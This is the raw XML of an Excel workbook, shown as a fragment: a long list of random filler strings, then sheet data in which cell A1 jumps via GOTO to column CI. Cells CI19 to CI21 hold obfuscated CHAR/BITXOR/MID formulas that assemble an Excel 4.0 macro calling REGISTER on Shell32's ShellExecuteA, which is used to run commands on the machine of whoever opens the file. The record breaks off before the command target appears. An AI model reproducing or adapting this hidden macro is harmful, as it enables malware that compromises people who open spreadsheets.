    <t>ysvkwqwccq</t>
  </si>
  <si>
    <t>hgvgrut</t>
  </si>
  <si>
    <t>ojdiwhtjsmblvpeakdrh</t>
  </si>
  <si>
    <t>ciipr</t>
  </si>
  <si>
    <t>mvrkxaxgoardot</t>
  </si>
  <si>
    <t>gswbdrpvnfxe</t>
  </si>
  <si>
    <t>rwnajdwgghyl</t>
  </si>
  <si>
    <t>fsvdnuviaxqwwq</t>
  </si>
  <si>
    <t>lgdprzx</t>
  </si>
  <si>
    <t>brypbez</t>
  </si>
  <si>
    <t>ijhehdg</t>
  </si>
  <si>
    <t>efjouofxwzsxiry</t>
  </si>
  <si>
    <t>jimgnkkpcsangophx</t>
  </si>
  <si>
    <t>kiadfegcvsujbmrqgx</t>
  </si>
  <si>
    <t>mxlydtft</t>
  </si>
  <si>
    <t>rijjstmldencsakbgedt</t>
  </si>
  <si>
    <t>lhtsuoojhod</t>
  </si>
  <si>
    <t>xzcsgkzb</t>
  </si>
  <si>
    <t>ebfmebxodmfystn</t>
  </si>
  <si>
    <t>qdyajfqnpgliqdgfr</t>
  </si>
  <si>
    <t>ciuaxgqr</t>
  </si>
  <si>
    <t>yrtfuohvdru</t>
  </si>
  <si>
    <t>fzhjqjlwhyivhwjqxioc</t>
  </si>
  <si>
    <t>vvrinnzla</t>
  </si>
  <si>
    <t>zpvmckcfzuyub</t>
  </si>
  <si>
    <t>zsuy</t>
  </si>
  <si>
    <t>xiwela</t>
  </si>
  <si>
    <t>onwtcwrgdmbwufhk</t>
  </si>
  <si>
    <t>rzgmogn</t>
  </si>
  <si>
    <t>orrnlufeqct</t>
  </si>
  <si>
    <t>kicovtkdadjkeqfhggv</t>
  </si>
  <si>
    <t>gnqftiuwoaipzvjqw</t>
  </si>
  <si>
    <t>ubrekjtnqgonskke</t>
  </si>
  <si>
    <t>tnpblhpf</t>
  </si>
  <si>
    <t>epzcmqlms</t>
  </si>
  <si>
    <t>otbdtqhmbq</t>
  </si>
  <si>
    <t>huojwjs</t>
  </si>
  <si>
    <t>ubwofxrsmtffuogzltl</t>
  </si>
  <si>
    <t>zfnek</t>
  </si>
  <si>
    <t>taxsyrhttuykotezjqz</t>
  </si>
  <si>
    <t>wpgermt</t>
  </si>
  <si>
    <t>txexsqhsl</t>
  </si>
  <si>
    <t>sefqwcthqzu</t>
  </si>
  <si>
    <t>oljgvodncpjazx</t>
  </si>
  <si>
    <t>xndcybmjuc</t>
  </si>
  <si>
    <t>trxcaquletlyrypewrb</t>
  </si>
  <si>
    <t>vcpetniovdpyvwurrxfk</t>
  </si>
  <si>
    <t>jomdwgdaqxdnzlu</t>
  </si>
  <si>
    <t>amhr</t>
  </si>
  <si>
    <t>xmdymtjqgnplk</t>
  </si>
  <si>
    <t>hykcgewtwlgomwblgeei</t>
  </si>
  <si>
    <t>vjbjymyrub</t>
  </si>
  <si>
    <t>lclckfaihxmhx</t>
  </si>
  <si>
    <t>ylqlycwahafawhfmuaf</t>
  </si>
  <si>
    <t>fpshmqoxwcbosmmv</t>
  </si>
  <si>
    <t>npaxjfkgejnxrmynnjpr</t>
  </si>
  <si>
    <t>ybstqjfidpe</t>
  </si>
  <si>
    <t>egxly</t>
  </si>
  <si>
    <t>vcijaubctdmpqklb</t>
  </si>
  <si>
    <t>tlqow</t>
  </si>
  <si>
    <t>aqqjetmnhokammcht</t>
  </si>
  <si>
    <t>sifahgquqosskom</t>
  </si>
  <si>
    <t>aqkvlezhzakymcccedfn</t>
  </si>
  <si>
    <t>ujrnrwynkwb</t>
  </si>
  <si>
    <t>mpdo</t>
  </si>
  <si>
    <t>gyrxzulqypubwo</t>
  </si>
  <si>
    <t>hxknsmrganxjixgi</t>
  </si>
  <si>
    <t>onliiavqguf</t>
  </si>
  <si>
    <t>zhjqvbpdzpdkd</t>
  </si>
  <si>
    <t>hsqptysblxkqldypgyc</t>
  </si>
  <si>
    <t>yjcojkzqzxlkfvzot</t>
  </si>
  <si>
    <t>xvkvjx</t>
  </si>
  <si>
    <t>qacojvhowcdadqggdc</t>
  </si>
  <si>
    <t>ngcjvj</t>
  </si>
  <si>
    <t>eajpad</t>
  </si>
  <si>
    <t>mtdxtufyvqpsafamixxr</t>
  </si>
  <si>
    <t>aiplzrt</t>
  </si>
  <si>
    <t>ndfro</t>
  </si>
  <si>
    <t>jryexv</t>
  </si>
  <si>
    <t>weqhwftlqn</t>
  </si>
  <si>
    <t>rsadwoy</t>
  </si>
  <si>
    <t>ntxw</t>
  </si>
  <si>
    <t>knmh</t>
  </si>
  <si>
    <t>agehm</t>
  </si>
  <si>
    <t>yhkrqzkqfudlou</t>
  </si>
  <si>
    <t>babwmxizldflvjuzhi</t>
  </si>
  <si>
    <t>iebyel</t>
  </si>
  <si>
    <t>lqhsokjzyefnih</t>
  </si>
  <si>
    <t>ksncxddbprluwpqd</t>
  </si>
  <si>
    <t>jkxfwecnylolk</t>
  </si>
  <si>
    <t>bcmiuaukrvyapbe</t>
  </si>
  <si>
    <t>jfiitumzrjqz</t>
  </si>
  <si>
    <t>xxnzujsnaefr</t>
  </si>
  <si>
    <t>mafyddnadwn</t>
  </si>
  <si>
    <t>fgyaudynglrdwzokkeo</t>
  </si>
  <si>
    <t>leteqwyiovusj</t>
  </si>
  <si>
    <t>sanmcwtmhcaqzddjbxbj</t>
  </si>
  <si>
    <t>dmhugwafffiv</t>
  </si>
  <si>
    <t>ovnouyotrqwdkkb</t>
  </si>
  <si>
    <t>ccgiwsfmrdl</t>
  </si>
  <si>
    <t>hoxebxaauo</t>
  </si>
  <si>
    <t>yivjtzuihsewuv</t>
  </si>
  <si>
    <t>uszvxxbgugsubymtve</t>
  </si>
  <si>
    <t>zums</t>
  </si>
  <si>
    <t>oaiidixuhzhdx</t>
  </si>
  <si>
    <t>vnovlzsqbshbugh</t>
  </si>
  <si>
    <t>twowfzsprd</t>
  </si>
  <si>
    <t>aadxgfqqmux</t>
  </si>
  <si>
    <t>nvuzcdldtowuasogbi</t>
  </si>
  <si>
    <t>pvnjerkdeydynvj</t>
  </si>
  <si>
    <t>jugmtxmkixgjtjpcpktj</t>
  </si>
  <si>
    <t>qznuagiow</t>
  </si>
  <si>
    <t>hkglggoxcmwh</t>
  </si>
  <si>
    <t>eixnzbeyspwptsqvqszk</t>
  </si>
  <si>
    <t>upmlwkungbnt</t>
  </si>
  <si>
    <t>hvdtuveln</t>
  </si>
  <si>
    <t>borpxotgqxbreqh</t>
  </si>
  <si>
    <t>axou</t>
  </si>
  <si>
    <t>urxrzp</t>
  </si>
  <si>
    <t>zbcfadfqlishepcmkdr</t>
  </si>
  <si>
    <t>tmtvhvhu</t>
  </si>
  <si>
    <t>jxgmpwgcpqcnczqmif</t>
  </si>
  <si>
    <t>zszqhckirmol</t>
  </si>
  <si>
    <t>fwixrbox</t>
  </si>
  <si>
    <t>vxtpsr</t>
  </si>
  <si>
    <t>kljbvpweldowvqesf</t>
  </si>
  <si>
    <t>kkwceocbejppbgzefw</t>
  </si>
  <si>
    <t>synmptdjrzpcfgsx</t>
  </si>
  <si>
    <t>yggilu</t>
  </si>
  <si>
    <t>yqhahbndtasoof</t>
  </si>
  <si>
    <t>ocoxyawqhnxfvpwl</t>
  </si>
  <si>
    <t>qkfwz</t>
  </si>
  <si>
    <t>trjj</t>
  </si>
  <si>
    <t>twzn</t>
  </si>
  <si>
    <t>ryvobjesbdl</t>
  </si>
  <si>
    <t>bhcukjuoxesqbnadkz</t>
  </si>
  <si>
    <t>cbqajtcecnu</t>
  </si>
  <si>
    <t>pmautvi</t>
  </si>
  <si>
    <t>opff</t>
  </si>
  <si>
    <t>agphrskghknkpekktf</t>
  </si>
  <si>
    <t>ebenfqbamfmrmcc</t>
  </si>
  <si>
    <t>bxlbkkploydsn</t>
  </si>
  <si>
    <t>ndreo</t>
  </si>
  <si>
    <t>xamxyxmdbotylsgdn</t>
  </si>
  <si>
    <t>xnraumigznwb</t>
  </si>
  <si>
    <t>abhghuoeecsyqlhwu</t>
  </si>
  <si>
    <t>fkocaigyhnmsry</t>
  </si>
  <si>
    <t>mtfmhgztuflnbwljq</t>
  </si>
  <si>
    <t>qekvmlehgzg</t>
  </si>
  <si>
    <t>igcqyf</t>
  </si>
  <si>
    <t>ueuhnxjkhmfrefpkr</t>
  </si>
  <si>
    <t>kmfhyatzhvczvfho</t>
  </si>
  <si>
    <t>couvndcfukmfbmpvy</t>
  </si>
  <si>
    <t>rhhowiwtyjutnv</t>
  </si>
  <si>
    <t>dmeocpbqtdxssfghn</t>
  </si>
  <si>
    <t>rfepfzqksm</t>
  </si>
  <si>
    <t>fjhzcy</t>
  </si>
  <si>
    <t>ibwyrkhtrgrr</t>
  </si>
  <si>
    <t>jzvuigh</t>
  </si>
  <si>
    <t>wxishanuygucncqk</t>
  </si>
  <si>
    <t>zkkbgpbmfwlp</t>
  </si>
  <si>
    <t>cmdxab</t>
  </si>
  <si>
    <t>zmvymlvhmaizrbemtaqw</t>
  </si>
  <si>
    <t>qkikk</t>
  </si>
  <si>
    <t>lblqcqjexlkxwmstv</t>
  </si>
  <si>
    <t>abzpcymngiybziqkqd</t>
  </si>
  <si>
    <t>ekzkvppjuo</t>
  </si>
  <si>
    <t>tlcegkfpuoenhbjozmg</t>
  </si>
  <si>
    <t>qjvjdebylxssyjzjxveu</t>
  </si>
  <si>
    <t>gdydujhidenoglmb</t>
  </si>
  <si>
    <t>qivnojanhnaaqwixqq</t>
  </si>
  <si>
    <t>hiezjkxx</t>
  </si>
  <si>
    <t>mhludsjsyzejjsrux</t>
  </si>
  <si>
    <t>aohpnrkk</t>
  </si>
  <si>
    <t>jekugbecinluaknep</t>
  </si>
  <si>
    <t>fqcaxnt</t>
  </si>
  <si>
    <t>yehxokcganxytz</t>
  </si>
  <si>
    <t>agezhlpkaph</t>
  </si>
  <si>
    <t>kirpjb</t>
  </si>
  <si>
    <t>xthpxrddcoz</t>
  </si>
  <si>
    <t>tatoqdy</t>
  </si>
  <si>
    <t>tusrmhublyzxedhxwme</t>
  </si>
  <si>
    <t>haida</t>
  </si>
  <si>
    <t>dunctjbgpggcxspjyri</t>
  </si>
  <si>
    <t>xyasfrpyssccuw</t>
  </si>
  <si>
    <t>krwcjlkewvsnknzeh</t>
  </si>
  <si>
    <t>twrf</t>
  </si>
  <si>
    <t>ijxthdmi</t>
  </si>
  <si>
    <t>gujejvkiraoknfrdtov</t>
  </si>
  <si>
    <t>skfjkjzumjtgdtjw</t>
  </si>
  <si>
    <t>vcgbaemy</t>
  </si>
  <si>
    <t>rkojhxvdzuglbbbmhtmk</t>
  </si>
  <si>
    <t>ftaododvk</t>
  </si>
  <si>
    <t>hmmvvttlyiytnhnrpbmw</t>
  </si>
  <si>
    <t>dtjkzbhrlyflb</t>
  </si>
  <si>
    <t>nhabpr</t>
  </si>
  <si>
    <t>nmtlgdm</t>
  </si>
  <si>
    <t>erxfacrlg</t>
  </si>
  <si>
    <t>wzwxky</t>
  </si>
  <si>
    <t>jjrkpzvbuv</t>
  </si>
  <si>
    <t>pkudrt</t>
  </si>
  <si>
    <t>pknoetqntocmnpj</t>
  </si>
  <si>
    <t>tmfyjtssiamer</t>
  </si>
  <si>
    <t>sgtelzw</t>
  </si>
  <si>
    <t>zqjoyhnegknxgcukowwh</t>
  </si>
  <si>
    <t>zazbhndpxkbf</t>
  </si>
  <si>
    <t>brougb</t>
  </si>
  <si>
    <t>hqvmyrcprbdhukxyy</t>
  </si>
  <si>
    <t>yepvynir</t>
  </si>
  <si>
    <t>afyzmscygf</t>
  </si>
  <si>
    <t>ecqgnmrxgjhkr</t>
  </si>
  <si>
    <t>quicpemmfqp</t>
  </si>
  <si>
    <t>mewmljzkpwslpfzt</t>
  </si>
  <si>
    <t>igjsrpmjdtewnhc</t>
  </si>
  <si>
    <t>lhhfcbjjksroddgsef</t>
  </si>
  <si>
    <t>vhkqictgaqd</t>
  </si>
  <si>
    <t>gpcigakvgwk</t>
  </si>
  <si>
    <t>ltsraqjyzbnyu</t>
  </si>
  <si>
    <t>fjhqzcomezwwxbfy</t>
  </si>
  <si>
    <t>wcwckuaritr</t>
  </si>
  <si>
    <t>ltkvjrqtpydtqdhhp</t>
  </si>
  <si>
    <t>wpndjb</t>
  </si>
  <si>
    <t>hdqkmdkqrvhmzwuki</t>
  </si>
  <si>
    <t>jwrjjadmozhvweb</t>
  </si>
  <si>
    <t>neztjujscfywe</t>
  </si>
  <si>
    <t>lbphxwerasiaugeewpd</t>
  </si>
  <si>
    <t>zblebozvzcs</t>
  </si>
  <si>
    <t>nbvqqoegshfttjvukx</t>
  </si>
  <si>
    <t>qzvmqpsnxkerhjn</t>
  </si>
  <si>
    <t>qtmoquorsob</t>
  </si>
  <si>
    <t>ybgopumxrgca</t>
  </si>
  <si>
    <t>bctmzvzburfbobe</t>
  </si>
  <si>
    <t>piclcyqycugkvgion</t>
  </si>
  <si>
    <t>dcwbpos</t>
  </si>
  <si>
    <t>swevxkxnjlrmnvtpw</t>
  </si>
  <si>
    <t>mymumxtnkmol</t>
  </si>
  <si>
    <t>pseyziv</t>
  </si>
  <si>
    <t>qgpzmeiiaitibz</t>
  </si>
  <si>
    <t>kqutqbruwhlxdtzfvfi</t>
  </si>
  <si>
    <t>bwqu</t>
  </si>
  <si>
    <t>tprsjduexphqpv</t>
  </si>
  <si>
    <t>obysvahtlzobyrtehvp</t>
  </si>
  <si>
    <t>klgzkwiakevuikktz</t>
  </si>
  <si>
    <t>xhmhamwnipqguoz</t>
  </si>
  <si>
    <t>xhjxot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</si>
</sst>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28</xdr:col>
      <xdr:colOff>259080</xdr:colOff>
      <xdr:row>67</xdr:row>
      <xdr:rowOff>2322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CF0553-F0A4-4191-805E-93730343E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327880" cy="12255282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12FA51D-C962-4E6D-A406-B27E6E258831}">
  <dimension ref="A1:GC172"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection sqref="A1:A172"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <sheetData>
    <row r="1" spans="1:107" x14ac:dyDescent="0.3">
      <c r="A1" t="b">
        <f>GOTO($CI$19)</f>
        <v>0</v>
      </c>
      <c r="H1" t="s">
        <v>0</v>
      </c>
      <c r="L1" t="s">
        <v>1</v>
      </c>
      <c r="T1" t="s">
        <v>2</v>
      </c>
      <c r="W1" t="s">
        <v>3</v>
      </c>
      <c r="Z1" t="s">
        <v>4</v>
      </c>
      <c r="AD1" t="s">
        <v>5</v>
      </c>
      <c r="AT1" t="s">
        <v>6</v>
      </c>
      <c r="BK1" t="s">
        <v>7</v>
      </c>
      <c r="CM1" t="s">
        <v>8</v>
      </c>
      <c r="CV1" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:107" x14ac:dyDescent="0.3">
      <c r="G2" t="s">
        <v>10</v>
      </c>
      <c r="L2" t="s">
        <v>11</v>
      </c>
      <c r="Y2" t="s">
        <v>12</v>
      </c>
      <c r="AE2" t="s">
        <v>13</v>
      </c>
      <c r="AP2" t="s">
        <v>14</v>
      </c>
      <c r="BC2" t="s">
        <v>15</v>
      </c>
      <c r="BF2" t="s">
        <v>16</v>
      </c>
      <c r="BP2" t="s">
        <v>17</v>
      </c>
      <c r="BV2" t="s">
        <v>18</v>
      </c>
      <c r="CG2" t="s">
        <v>19</v>
      </c>
      <c r="CH2" t="s">
        <v>20</v>
      </c>
      <c r="CV2" t="s">
        <v>21</v>
      </c>
      <c r="DC2" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="3" spans="1:107" x14ac:dyDescent="0.3">
      <c r="P3" t="s">
        <v>23</v>
      </c>
      <c r="AF3" t="s">
        <v>24</v>
      </c>
      <c r="AH3" t="s">
        <v>25</v>
      </c>
      <c r="BF3" t="s">
        <v>26</v>
      </c>
      <c r="BU3" t="s">
        <v>27</v>
      </c>
      <c r="CT3" t="s">
        <v>28</v>
      </c>
      <c r="DA3" t="s">
        <v>29</v>
      </c>
    </row>
    <row r="4" spans="1:107" x14ac:dyDescent="0.3">
      <c r="D4" t="s">
        <v>30</v>
      </c>
      <c r="AB4" t="s">
        <v>31</v>
      </c>
      <c r="AG4" t="s">
        <v>32</v>
      </c>
      <c r="AI4" t="s">
        <v>33</v>
      </c>
      <c r="CK4" t="s">
        <v>34</v>
      </c>
      <c r="CL4" t="s">
        <v>35</v>
      </c>
    </row>
    <row r="5" spans="1:107" x14ac:dyDescent="0.3">
      <c r="AO5" t="s">
        <v>36</v>
      </c>
      <c r="AQ5" t="s">
        <v>37</v>
      </c>
      <c r="BA5" t="s">
        <v>38</v>
      </c>
      <c r="BB5" t="s">
        <v>39</v>
      </c>
      <c r="BE5" t="s">
        <v>40</v>
      </c>
      <c r="CB5" t="s">
        <v>41</v>
      </c>
      <c r="CJ5" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="6" spans="1:107" x14ac:dyDescent="0.3">
      <c r="D6" t="s">
        <v>43</v>
      </c>
      <c r="L6" t="s">
        <v>44</v>
      </c>
      <c r="M6" t="s">
        <v>45</v>
      </c>
      <c r="R6" t="s">
        <v>46</v>
      </c>
      <c r="Z6" t="s">
        <v>47</v>
      </c>
      <c r="AN6" t="s">
        <v>48</v>
      </c>
      <c r="AR6" t="s">
        <v>49</v>
      </c>
      <c r="AV6" t="s">
        <v>50</v>
      </c>
      <c r="AZ6" t="s">
        <v>51</v>
      </c>
      <c r="BH6" t="s">
        <v>52</v>
      </c>
      <c r="BJ6" t="s">
        <v>53</v>
      </c>
      <c r="BN6" t="s">
        <v>54</v>
      </c>
      <c r="CG6" t="s">
        <v>55</v>
      </c>
      <c r="CH6" t="s">
        <v>56</v>
      </c>
      <c r="CK6" t="s">
        <v>57</v>
      </c>
      <c r="CM6" t="s">
        <v>58</v>
      </c>
      <c r="CV6" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="7" spans="1:107" x14ac:dyDescent="0.3">
      <c r="B7" t="s">
        <v>60</v>
      </c>
      <c r="N7" t="s">
        <v>61</v>
      </c>
      <c r="Q7" t="s">
        <v>62</v>
      </c>
      <c r="X7" t="s">
        <v>63</v>
      </c>
      <c r="AB7" t="s">
        <v>64</v>
      </c>
      <c r="AJ7" t="s">
        <v>65</v>
      </c>
      <c r="BD7" t="s">
        <v>66</v>
      </c>
      <c r="CI7" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="8" spans="1:107" x14ac:dyDescent="0.3">
      <c r="H8" t="s">
        <v>68</v>
      </c>
      <c r="N8" t="s">
        <v>69</v>
      </c>
      <c r="AI8" t="s">
        <v>70</v>
      </c>
      <c r="BA8" t="s">
        <v>71</v>
      </c>
      <c r="BC8" t="s">
        <v>72</v>
      </c>
      <c r="BG8" t="s">
        <v>73</v>
      </c>
      <c r="BJ8" t="s">
        <v>74</v>
      </c>
      <c r="BQ8" t="s">
        <v>75</v>
      </c>
      <c r="BU8" t="s">
        <v>76</v>
      </c>
      <c r="BZ8" t="s">
        <v>77</v>
      </c>
      <c r="CY8" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="9" spans="1:107" x14ac:dyDescent="0.3">
      <c r="C9" t="s">
        <v>79</v>
      </c>
      <c r="AG9" t="s">
        <v>80</v>
      </c>
      <c r="AH9" t="s">
        <v>81</v>
      </c>
      <c r="AI9" t="s">
        <v>82</v>
      </c>
      <c r="AQ9" t="s">
        <v>83</v>
      </c>
      <c r="BJ9" t="s">
        <v>84</v>
      </c>
      <c r="BK9" t="s">
        <v>85</v>
      </c>
      <c r="BP9" t="s">
        <v>86</v>
      </c>
      <c r="BR9" t="s">
        <v>87</v>
      </c>
      <c r="BW9" t="s">
        <v>88</v>
      </c>
      <c r="CB9" t="s">
        <v>89</v>
      </c>
      <c r="CE9" t="s">
        <v>90</v>
      </c>
      <c r="CH9" t="s">
        <v>91</v>
      </c>
      <c r="CK9" t="s">
        <v>92</v>
      </c>
      <c r="CN9" t="s">
        <v>93</v>
      </c>
      <c r="CV9" t="s">
        <v>94</v>
      </c>
    </row>
    <row r="10" spans="1:107" x14ac:dyDescent="0.3">
      <c r="E10" t="s">
        <v>95</v>
      </c>
      <c r="K10" t="s">
        <v>96</v>
      </c>
      <c r="AW10" t="s">
        <v>97</v>
      </c>
      <c r="BH10" t="s">
        <v>98</v>
      </c>
      <c r="BM10" t="s">
        <v>99</v>
      </c>
      <c r="BT10" t="s">
        <v>100</v>
      </c>
      <c r="CS10" t="s">
        <v>101</v>
      </c>
    </row>
    <row r="11" spans="1:107" x14ac:dyDescent="0.3">
      <c r="L11" t="s">
        <v>102</v>
      </c>
      <c r="O11" t="s">
        <v>103</v>
      </c>
      <c r="AG11" t="s">
        <v>104</v>
      </c>
      <c r="AQ11" t="s">
        <v>105</v>
      </c>
      <c r="AR11" t="s">
        <v>106</v>
      </c>
      <c r="BA11" t="s">
        <v>107</v>
      </c>
      <c r="BP11" t="s">
        <v>108</v>
      </c>
      <c r="CD11" t="s">
        <v>109</v>
      </c>
      <c r="CT11" t="s">
        <v>110</v>
      </c>
    </row>
    <row r="12" spans="1:107" x14ac:dyDescent="0.3">
      <c r="A12" t="s">
        <v>111</v>
      </c>
      <c r="Y12" t="s">
        <v>112</v>
      </c>
      <c r="AC12" t="s">
        <v>113</v>
      </c>
      <c r="AO12" t="s">
        <v>114</v>
      </c>
      <c r="BK12" t="s">
        <v>115</v>
      </c>
      <c r="BM12" t="s">
        <v>116</v>
      </c>
      <c r="CD12" t="s">
        <v>117</v>
      </c>
      <c r="CN12" t="s">
        <v>118</v>
      </c>
      <c r="CR12" t="s">
        <v>119</v>
      </c>
    </row>
    <row r="13" spans="1:107" x14ac:dyDescent="0.3">
      <c r="L13" t="s">
        <v>120</v>
      </c>
      <c r="O13" t="s">
        <v>121</v>
      </c>
      <c r="S13" t="s">
        <v>122</v>
      </c>
      <c r="AH13" t="s">
        <v>123</v>
      </c>
      <c r="AT13" t="s">
        <v>124</v>
      </c>
      <c r="BQ13" t="s">
        <v>125</v>
      </c>
      <c r="BV13" t="s">
        <v>126</v>
      </c>
      <c r="CD13" t="s">
        <v>127</v>
      </c>
      <c r="DB13" t="s">
        <v>128</v>
      </c>
    </row>
    <row r="14" spans="1:107" x14ac:dyDescent="0.3">
      <c r="B14" t="s">
        <v>129</v>
      </c>
      <c r="E14" t="s">
        <v>130</v>
      </c>
      <c r="I14" t="s">
        <v>131</v>
      </c>
      <c r="J14" t="s">
        <v>132</v>
      </c>
      <c r="V14" t="s">
        <v>133</v>
      </c>
      <c r="AH14" t="s">
        <v>134</v>
      </c>
      <c r="AM14" t="s">
        <v>135</v>
      </c>
      <c r="AS14" t="s">
        <v>136</v>
      </c>
      <c r="AW14" t="s">
        <v>137</v>
      </c>
      <c r="BY14" t="s">
        <v>138</v>
      </c>
      <c r="CT14" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="15" spans="1:107" x14ac:dyDescent="0.3">
      <c r="R15" t="s">
        <v>140</v>
      </c>
      <c r="T15" t="s">
        <v>141</v>
      </c>
      <c r="X15" t="s">
        <v>142</v>
      </c>
      <c r="AE15" t="s">
        <v>143</v>
      </c>
      <c r="BQ15" t="s">
        <v>144</v>
      </c>
      <c r="BY15" t="s">
        <v>145</v>
      </c>
      <c r="CC15" t="s">
        <v>146</v>
      </c>
      <c r="CL15" t="s">
        <v>147</v>
      </c>
      <c r="CV15" t="s">
        <v>148</v>
      </c>
      <c r="DC15" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="16" spans="1:107" x14ac:dyDescent="0.3">
      <c r="C16" t="s">
        <v>150</v>
      </c>
      <c r="M16" t="s">
        <v>151</v>
      </c>
      <c r="Z16" t="s">
        <v>152</v>
      </c>
      <c r="AG16" t="s">
        <v>153</v>
      </c>
      <c r="AN16" t="s">
        <v>154</v>
      </c>
      <c r="AO16" t="s">
        <v>155</v>
      </c>
      <c r="AQ16" t="s">
        <v>156</v>
      </c>
      <c r="AU16" t="s">
        <v>157</v>
      </c>
      <c r="AW16" t="s">
        <v>158</v>
      </c>
      <c r="BE16" t="s">
        <v>159</v>
      </c>
      <c r="BM16" t="s">
        <v>160</v>
      </c>
      <c r="CD16" t="s">
        <v>161</v>
      </c>
      <c r="CQ16" t="s">
        <v>162</v>
      </c>
      <c r="CZ16" t="s">
        <v>163</v>
      </c>
    </row>
    <row r="17" spans="1:107" x14ac:dyDescent="0.3">
      <c r="H17" t="s">
        <v>164</v>
      </c>
      <c r="J17" t="s">
        <v>165</v>
      </c>
      <c r="L17" t="s">
        <v>166</v>
      </c>
      <c r="W17" t="s">
        <v>167</v>
      </c>
      <c r="AU17" t="s">
        <v>168</v>
      </c>
      <c r="BM17" t="s">
        <v>169</v>
      </c>
      <c r="BU17" t="s">
        <v>170</v>
      </c>
      <c r="BY17" t="s">
        <v>171</v>
      </c>
      <c r="CA17" t="s">
        <v>172</v>
      </c>
      <c r="CL17" t="s">
        <v>173</v>
      </c>
    </row>
    <row r="18" spans="1:107" x14ac:dyDescent="0.3">
      <c r="T18" t="s">
        <v>174</v>
      </c>
      <c r="AD18" t="s">
        <v>175</v>
      </c>
      <c r="AE18" t="s">
        <v>176</v>
      </c>
      <c r="AJ18" t="s">
        <v>177</v>
      </c>
      <c r="AQ18" t="s">
        <v>178</v>
      </c>
      <c r="AT18" t="s">
        <v>179</v>
      </c>
      <c r="BA18" t="s">
        <v>180</v>
      </c>
      <c r="BY18" t="s">
        <v>181</v>
      </c>
      <c r="CA18" t="s">
        <v>182</v>
      </c>
    </row>
    <row r="19" spans="1:107" x14ac:dyDescent="0.3">
      <c r="R19" t="s">
        <v>183</v>
      </c>
      <c r="AK19" t="s">
        <v>184</v>
      </c>
      <c r="AM19" t="s">
        <v>185</v>
      </c>
      <c r="AS19" t="s">
        <v>186</v>
      </c>
      <c r="BE19" t="s">
        <v>187</v>
      </c>
      <c r="BJ19" t="s">
        <v>188</v>
      </c>
      <c r="BK19" t="s">
        <v>189</v>
      </c>
      <c r="BO19" t="s">
        <v>190</v>
      </c>
      <c r="CI19" t="str">
        <f>CONCATENATE(MID("spdrq=zs",6,1),CHAR(82),CHAR(_xlfn.BITXOR(167,226)),CHAR(INT("71")),CHAR(73),CHAR(_xlfn.BITXOR(1,82)),CHAR(84),CHAR(_xlfn.BITXOR(545,612)),CHAR(_xlfn.BITXOR(205,159)),CHAR(40),CHAR(34),CHAR(INT("83")),CHAR(_xlfn.BITXOR(73,33)),MID("nmhviie",7,1),CHAR(INT("108")),CHAR(_xlfn.BITXOR(748,640)))</f>
        <v>=REGISTER("Shell</v>
      </c>
      <c r="CT19" t="s">
        <v>191</v>
      </c>
    </row>
    <row r="20" spans="1:107" x14ac:dyDescent="0.3">
      <c r="I20" t="s">
        <v>192</v>
      </c>
      <c r="S20" t="s">
        <v>193</v>
      </c>
      <c r="Y20" t="s">
        <v>194</v>
      </c>
      <c r="AT20" t="s">
        <v>195</v>
      </c>
      <c r="AX20" t="s">
        <v>196</v>
      </c>
      <c r="BB20" t="s">
        <v>197</v>
      </c>
      <c r="BE20" t="s">
        <v>198</v>
      </c>
      <c r="BQ20" t="s">
        <v>199</v>
      </c>
      <c r="CD20" t="s">
        <v>200</v>
      </c>
      <c r="CI20" t="str">
        <f>CONCATENATE(MID("owm3",4,1),CHAR(50),CHAR(34),CHAR(_xlfn.BITXOR(696,660)),CHAR(34),CHAR(INT("83")),MID("jhby",2,1),CHAR(MOD(604,503)),MID("wglq",3,1),MID("wled",2,1),CHAR(69),CHAR(INT("120")),CHAR(101),CHAR(MOD(466,367)),CHAR(MOD(336,219)),MID("htgquho",2,1),CHAR(INT("101")))</f>
        <v>32","ShellExecute</v>
      </c>
    </row>
    <row r="21" spans="1:107" x14ac:dyDescent="0.3">
      <c r="K21" t="s">
        <v>201</v>
      </c>
      <c r="Q21" t="s">
        <v>202</v>
      </c>
      <c r="Y21" t="s">
        <v>203</v>
      </c>
      <c r="AG21" t="s">
        <v>204</v>
      </c>
      <c r="AM21" t="s">
        <v>205</v>
      </c>
      <c r="AS21" t="s">
        <v>206</v>
      </c>
      <c r="BL21" t="s">
        <v>207</v>
      </c>
      <c r="BN21" t="s">
        <v>208</v>
      </c>
      <c r="CF21" t="s">
        <v>209</v>
      </c>
      <c r="CI21" t="str">
        <f>CONCATENATE(CHAR(MOD(469,404)),CHAR(34),CHAR(_xlfn.BITXOR(263,299)),CHAR(34),CHAR(INT("74")),CHAR(_xlfn.BITXOR(112,58)),CHAR(INT("67")),CHAR(_xlfn.BITXOR(1019,952)),CHAR(_xlfn.BITXOR(901,966)),CHAR(INT("74")),MID("Jacbgijfx",1,1),CHAR(34),CHAR(44),CHAR(34),CHAR(MOD(475,362)),CHAR(_xlfn.BITXOR(327,288)))</f>
        <v>A","JJCCCJJ","qg</v>
      </c>
      <c r="CW21" t="s">
        <v>210</v>
      </c>
    </row>
    <row r="22" spans="1:107" x14ac:dyDescent="0.3">
      <c r="C22" t="s">
        <v>211</v>
      </c>
      <c r="J22" t="s">
        <v>212</v>
      </c>
      <c r="O22" t="s">
        <v>213</v>
      </c>
      <c r="W22" t="s">
        <v>214</v>
      </c>
      <c r="AQ22" t="s">
        <v>215</v>
      </c>
      <c r="BG22" t="s">
        <v>216</v>
      </c>
      <c r="BH22" t="s">
        <v>217</v>
      </c>
      <c r="BP22" t="s">
        <v>218</v>
      </c>
      <c r="BR22" t="s">
        <v>219</v>
      </c>
      <c r="CA22" t="s">
        <v>220</v>
      </c>
      <c r="CI22" t="str">
